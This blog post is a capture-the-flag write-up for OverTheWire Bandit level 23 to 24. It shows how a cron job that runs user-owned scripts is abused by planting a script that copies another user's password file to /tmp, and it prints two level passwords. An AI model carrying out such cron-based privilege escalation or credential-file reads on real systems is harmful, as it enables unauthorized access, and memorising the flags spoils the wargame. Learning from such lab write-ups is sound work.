---
layout: single
title: "Bandit Level 23 Level 24"
date: 2024-02-15 20:22:52 -5200
categories: ctf, bandit, overthewire, writeup
---

![Bandit Level 23 Level 24]({{ site.url }}{{ site.baseurl }}/assets/img/bandit-level-23-level-24-00.png)
------------
Welcome back, in this level we will learn some basics of privilege escalation by abusing cron jobs.

### Previous flag

```
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```

### Checking Cron files

Let´s start checking cron jobs for the user `bandit24`. 

```bash
cat /etc/cron.d/cronjob_bandit24
```

The entries within this file reveal the location of a script in the /usr/bin folder.

### Reading Cron Script

Let’s open the .sh script file and check its contents:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

The contents of this file show us that the cron job iterates over the files in the `/var/spool/bandit24/foo` folder and executes files owned by us, `bandit23`

```jsx
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

Let’s write a bash command that copies the password from `bandit24` to a temporary location

```bash

cat /etc/bandit_pass/bandit24 > /tmp/bandit23/password.txt
```

### Abusing the Cron Job

Create a directory and script to intercept the password:

```bash
mkdir /tmp/bandit23
nano /var/spool/bandit24/foo/script.sh
```

Within the newly created script, inscribe the command we defined before:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit23/password.txt
```

Grant execution permissions to the script:

```bash
chmod +x /var/spool/bandit24/foo/script.sh
```

Now, the exploit is set. After the cron job is executed, we can read the password for the next level:

```bash
cat /tmp/bandit23/password.txt
```

Flag:

```
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```
